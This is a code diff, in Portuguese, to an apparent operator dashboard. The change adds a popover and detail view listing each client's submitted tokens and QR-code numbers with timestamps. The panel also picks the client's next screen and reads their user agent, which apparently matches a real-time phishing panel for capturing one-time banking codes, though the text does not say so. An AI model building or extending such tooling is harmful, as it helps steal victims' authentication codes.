@@ -15,6 +15,7 @@ import {
   EyeOff,
   QrCode,
   Upload,
+  History,
 } from "lucide-react";
 import {
   listarSolicitacoes,
@@ -27,9 +28,15 @@ import {
   salvarTokenNome,
   enviarQrCode,
   limparQrCode,
+  listarTokensHistorico,
 } from "@/lib/solicitacoes.functions";
 
-import { StatusBadge, formatarData, type StatusSolicitacao } from "@/components/solicitacoes-ui";
+import {
+  StatusBadge,
+  TokenTipoBadge,
+  formatarData,
+  type StatusSolicitacao,
+} from "@/components/solicitacoes-ui";
 
 export const Route = createFileRoute("/_authenticated/painel")({
   head: () => ({
@@ -85,6 +92,15 @@ type Row = {
   token_nome: string | null;
   qr_code_url: string | null;
   operador: string | null;
+};
+
+type TokenHist = {
+  id: string;
+  solicitacao_id: string;
+  usuario: string;
+  token: string;
+  tipo: string;
+  enviado_em: string;
 };
 
 function parseUA(ua: string | null): { browser: string; os: string } {
@@ -227,6 +243,7 @@ function PainelPage() {
   const salvarNome = useServerFn(salvarTokenNome);
   const enviarQr = useServerFn(enviarQrCode);
   const limparQr = useServerFn(limparQrCode);
+  const listarTokensHist = useServerFn(listarTokensHistorico);
   const queryClient = useQueryClient();
   const qrInputRef = useRef<HTMLInputElement | null>(null);
   const [qrTargetId, setQrTargetId] = useState<string | null>(null);
@@ -238,15 +255,19 @@ function PainelPage() {
   const [motivo, setMotivo] = useState("");
   const [proximaTela, setProximaTela] = useState<ProximaTela>("token_celular");
   const [menuLiberarId, setMenuLiberarId] = useState<string | null>(null);
+  const [historicoAbertoId, setHistoricoAbertoId] = useState<string | null>(null);
   const [serials, setSerials] = useState<Record<string, string>>({});
   const [nomes, setNomes] = useState<Record<string, string>>({});
 
   useEffect(() => {
-    if (!menuLiberarId) return;
-    const fechar = () => setMenuLiberarId(null);
+    if (!menuLiberarId && !historicoAbertoId) return;
+    const fechar = () => {
+      setMenuLiberarId(null);
+      setHistoricoAbertoId(null);
+    };
     window.addEventListener("click", fechar);
     return () => window.removeEventListener("click", fechar);
-  }, [menuLiberarId]);
+  }, [menuLiberarId, historicoAbertoId]);
 
   const lista = useQuery<Row[]>({
     queryKey: ["solicitacoes", filtro],
@@ -259,6 +280,18 @@ function PainelPage() {
     queryFn: () => contar({}),
     refetchInterval: 3000,
   });
+
+  const tokensHist = useQuery<TokenHist[]>({
+    queryKey: ["tokens-historico"],
+    queryFn: () => listarTokensHist({ data: { busca: "" } }) as unknown as Promise<TokenHist[]>,
+    refetchInterval: 3000,
+  });
+
+  const tokensPorCliente = useMemo(() => {
+    const map: Record<string, TokenHist[]> = {};
+    for (const t of tokensHist.data ?? []) (map[t.solicitacao_id] ??= []).push(t);
+    return map;
+  }, [tokensHist.data]);
 
   // Realtime updates rely on Supabase Auth RLS; with env-based login the
   // queries above already poll every 2-3s, which keeps this in sync.
@@ -787,7 +820,7 @@ function PainelPage() {
                     </td>
 
                     <td className="px-3 py-3">
-                      <div className="flex flex-wrap items-center gap-1.5">
+                      <div className="relative flex flex-wrap items-center gap-1.5">
                         {s.token ? (
                           <CopyText
                             value={s.token}
@@ -870,6 +903,48 @@ function PainelPage() {
                           <span className="text-muted-foreground">—</span>
                         )}
                         <DotBadge ok={!!s.token} />
+                        {(tokensPorCliente[s.id]?.length ?? 0) > 0 && (
+                          <button
+                            type="button"
+                            title="Histórico de tokens deste cliente"
+                            onClick={(e) => {
+                              e.stopPropagation();
+                              setHistoricoAbertoId((cur) => (cur === s.id ? null : s.id));
+                            }}
+                            className="inline-flex items-center gap-1 rounded border border-border bg-background px-1.5 py-1 font-mono text-[11px] text-muted-foreground transition-colors hover:text-foreground"
+                          >
+                            <History className="size-3" />
+                            {tokensPorCliente[s.id]!.length}
+                          </button>
+                        )}
+                        {historicoAbertoId === s.id && (
+                          <div
+                            onClick={(e) => e.stopPropagation()}
+                            className="absolute top-7 right-0 z-20 max-h-56 w-64 overflow-y-auto rounded-md border border-border bg-popover p-2 shadow-lg"
+                          >
+                            <div className="mb-1.5 font-mono text-[10px] tracking-wider text-muted-foreground uppercase">
+                              Tokens enviados por {s.usuario}
+                            </div>
+                            <div className="space-y-1.5">
+                              {tokensPorCliente[s.id]!.map((t) => (
+                                <div
+                                  key={t.id}
+                                  className="flex items-center justify-between gap-2 rounded border border-border/60 bg-background px-2 py-1.5"
+                                >
+                                  <div className="min-w-0">
+                                    <TokenTipoBadge tipo={t.tipo} />
+                                    <div className="mt-1 font-mono text-[12px] tracking-widest text-foreground">
+                                      {t.token}
+                                    </div>
+                                  </div>
+                                  <span className="shrink-0 text-[10px] text-muted-foreground">
+                                    {formatarData(t.enviado_em)}
+                                  </span>
+                                </div>
+                              ))}
+                            </div>
+                          </div>
+                        )}
                       </div>
                     </td>
 
@@ -1006,13 +1081,42 @@ function PainelPage() {
                 </div>
               </div>
 
-              {atual.token && (
+              {(atual.token || (tokensPorCliente[atual.id]?.length ?? 0) > 0) && (
                 <div className="space-y-1.5">
                   <div className="font-mono text-[10px] tracking-wider text-muted-foreground uppercase">
-                    Token do cliente
+                    Histórico de tokens
                   </div>
-                  <div className="rounded border border-emerald-500/40 bg-emerald-500/10 px-3 py-2 font-mono text-base tracking-widest text-emerald-300">
-                    {atual.token}
+                  <div className="max-h-64 space-y-1.5 overflow-y-auto">
+                    {(tokensPorCliente[atual.id]?.length
+                      ? tokensPorCliente[atual.id]!
+                      : atual.token
+                        ? ([
+                            {
+                              id: "fallback",
+                              solicitacao_id: atual.id,
+                              usuario: atual.usuario,
+                              tipo: /^\d{8}$/.test(atual.token) ? "qrcode" : "token",
+                              token: atual.token,
+                              enviado_em: atual.token_em ?? atual.criado_em,
+                            },
+                          ] as TokenHist[])
+                        : []
+                    ).map((t) => (
+                      <div
+                        key={t.id}
+                        className="flex items-center justify-between gap-2 rounded border border-emerald-500/40 bg-emerald-500/10 px-3 py-2"
+                      >
+                        <div className="min-w-0">
+                          <TokenTipoBadge tipo={t.tipo} />
+                          <div className="mt-1 font-mono text-base tracking-widest text-emerald-300">
+                            {t.token}
+                          </div>
+                        </div>
+                        <span className="shrink-0 text-[10px] text-muted-foreground">
+                          {formatarData(t.enviado_em)}
+                        </span>
+                      </div>
+                    ))}
                   </div>
                 </div>
               )}
